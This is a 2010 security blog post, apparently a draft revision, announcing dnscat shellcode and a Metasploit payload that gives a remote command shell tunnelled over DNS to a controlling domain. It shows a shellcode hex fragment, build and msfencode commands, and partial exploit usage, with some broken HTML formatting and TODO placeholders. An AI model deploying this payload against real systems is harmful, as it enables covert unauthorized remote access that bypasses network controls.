---
id: 613
title: 'Weaponizing dnscat with shellcode and Metasploit'
date: '2010-03-17T20:07:36-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/?p=613'
permalink: '/?p=613'
---

Hey all,

I've been letting other projects slip these last couple weeks because I was excited about converting dnscat into shellcode. Even though I got into the security field with reverse engineering and writing hacks for games, I have never written more than a couple lines of x86, nor have I ever written shellcode, so this was a learning experience. Most people start with shellcode that spawns a local shell; I decided to start with shellcode that implements a dnscat client in under 1024 bytes. It's a party!  
  
If you just want to grab the files, here are some links:

- [Win32 shellcode - assembler](/blogdata/dnscat-shell-win32.asm)
- [Win32 shellcode - binary](/blogdata/dnscat-shell-win32)
- [Win32 shellcode - C array](/blogdata/dnscat-shell-win32.h)
- [Win32 Metasploit module](/blogdata/dnscat-shell-win32)
- Linux shellcode - assembler
- Linux shellcode - binary
- Linux shellcode - C array

If you want to get your hands dirty, you can compile the source -- right now, it's only in svn:

```
svn co http://svn.skullsecurity.org:81/ron/security/nbtool
cd nbtool
make
```

That'll compile both dnscat (the client + server) and, if you have nasm installed, the Linux and Windows shellcodes. On Windows, you'll need nasm to assemble it (I used Cygwin) -- you can compile the Windows shellcode on Linux and vice versa, though. The output will be in samples/shellcode-\*/. A .h file containing the C version will be generated, as well:

```
$ head -n3 dnscat-shell-test.h
char shellcode[] =
        "\xe9\xa2\x01\x00\x00\x5d\x81\xec\x00\x04\x00\x00\xe8\x4e\x03\x00"
        "\x00\x31\xdb\x80\xc3\x09\x89\xef\xe8\x2e\x03\x00\x00\x80\xc3\x06"
...
```

And, of course, the raw file is output (without an extension), that can be run through msfencode or embedded into a script:

```
 $ make
[...]
$ wc -c samples/shellcode-win32/dnscat-shell-win32
997 samples/shellcode-win32/dnscat-shell-win32
$ wc -c samples/shellcode-linux/dnscat-shell-linux
988 samples/shellcode-linux/dnscat-shell-linux
```

Unless you want to be sending your cmd.exe (or sh) shell to skullseclabs.org, you'll have to modify the domain as well -- the very last line in the assembly code for both Windows and Linux is this:

```
get_domain:
 call get_domain_top
 db 1, 'a' ; random
 db 12,'skullseclabs' ; 
<p>The two lines with the domain have to be changed. The number preceding the name is, as the comment says, the length of the section ('skullseclabs' is 12 bytes, and 'org' is 3 bytes). This process is automated with the Metasploit payload, as you'll see. </p>
<h2>Encoding with msfencode</h2>
<p>msfencode from the Metasploit project is a beautiful utility. I highly recommend running shellcode through it before using it. The most useful aspect with shellcode is, at least to me, the ability to eliminate characters. So, if I need to get rid of \x00 (null) characters from my strings, it's as easy as:</p>
$ msfencode -b "\x00"  dnscat-shell-win32-encoded
[*] x86/shikata_ga_nai succeeded with size 1024 (iteration=1)

<p>If you're planning on using this in, for example, Metasploit, you don't have to worry about the msfencode step -- it'll do that for you. </p>
<h2>Metasploit payload</h2>
<p>Speaking of metasploit, yes! I wrote a metasploit payload for dnscat. </p>
<p>First, there are a number of caveats:</p>
```

- This is highly experimental
- This doesn't have a proper "exitfunc" call -- it just returns and probably crashes the system
- This is set up as a single stage, and is 1000 or so bytes -- as a result, it won't work against most vulnerabilities

That being said, it also works great when it's usable. The target I use for testing is Icecast 2 (TODO), which is included on the SANS 560 and 504 CDs. It's free, GPL, reliable, and has 2000 bytes in which to stuff the payload.

To use this, download the payload module (TODO: link), put it in your metasploit directory (modules/payloads/singles/windows), and use:

```
use exploit/windows/http/icecast2_host (TODO);
etc.
```

## Why bother?

The big advantage to this over traditional shellcode is that no port, whether inbound or outbound, is required! As long as the server has a DNS server set that will perform recursive lookups, it'll work great!

## Feedback

As I said, this is the first time I've ever written shellcode or x86. I'm sure there are lots of places where it could be significantly improved, and I'd love to hear feedback from the folks who really know what they're doing and can help me improve my code.

Thanks!